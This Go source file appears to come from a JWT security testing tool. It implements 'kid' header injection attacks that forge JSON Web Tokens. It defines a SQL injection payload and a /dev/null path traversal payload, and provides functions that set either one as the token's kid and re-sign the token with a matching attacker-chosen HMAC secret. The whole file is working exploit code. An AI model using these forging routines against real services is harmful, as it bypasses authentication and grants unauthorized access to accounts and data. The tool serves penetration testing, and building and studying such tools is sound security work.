package exploit

import (
	"fmt"

	jwtpkg "github.com/cerberauth/jwtop/jwt"
	"github.com/cerberauth/jwtop/jwt/editor"
	jwtlib "github.com/golang-jwt/jwt/v5"
)

// DefaultKidSQLPayload is a SQL injection string commonly used to make a
// database return an attacker-controlled key. Pair it with the injected value
// as the HMAC secret.
const DefaultKidSQLPayload = "' UNION SELECT 'secret' FROM tokens WHERE '1'='1" //nolint:gosec

// DefaultKidPathTraversalPayload is a path traversal string pointing to
// /dev/null. When the server reads the key from the file named by kid, it
// receives an empty byte sequence. Pair this with an empty HMAC secret.
const DefaultKidPathTraversalPayload = "/dev/null"

// KidInjection produces a copy of the token with the kid header field set to
// kidValue and re-signed with the given method and key. The signing method
// defaults to the original token's algorithm when method is nil.
//
// This is the generic primitive; KidSQLInjection and KidPathTraversal are
// convenience wrappers for the two most common attack patterns.
func KidInjection(tokenString string, kidValue string, method jwtlib.SigningMethod, key interface{}) (string, error) {
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return "", fmt.Errorf("parsing token: %w", err)
	}

	if method == nil {
		method = te.GetToken().Method
	}

	claims := jwtpkg.NewOrderedMapClaims(te.GetToken())
	tok := jwtlib.NewWithClaims(method, claims)
	tok.Header["kid"] = kidValue

	result, err := tok.SignedString(key)
	if err != nil {
		return "", fmt.Errorf("signing with kid injection: %w", err)
	}
	return result, nil
}

// KidSQLInjection sets kid to a SQL injection payload and re-signs the token
// with hmacSecret as the HMAC key. The default payload makes a typical
// `SELECT key FROM keys WHERE kid=?` query return the injected value.
//
// Pass hmacSecret matching whatever value the SQL injection returns —
// conventionally "secret" when using DefaultKidSQLPayload.
func KidSQLInjection(tokenString string, sqlPayload string, hmacSecret []byte) (string, error) { //nolint:gosec
	return KidInjection(tokenString, sqlPayload, jwtlib.SigningMethodHS256, hmacSecret)
}

// KidPathTraversal sets kid to a filesystem path and re-signs the token with
// hmacSecret. When the server reads the key from the file named by kid,
// pointing to /dev/null (or DefaultKidPathTraversalPayload) causes an empty
// key to be used — pair it with an empty secret.
func KidPathTraversal(tokenString string, path string, hmacSecret []byte) (string, error) { //nolint:gosec
	return KidInjection(tokenString, path, jwtlib.SigningMethodHS256, hmacSecret)
}
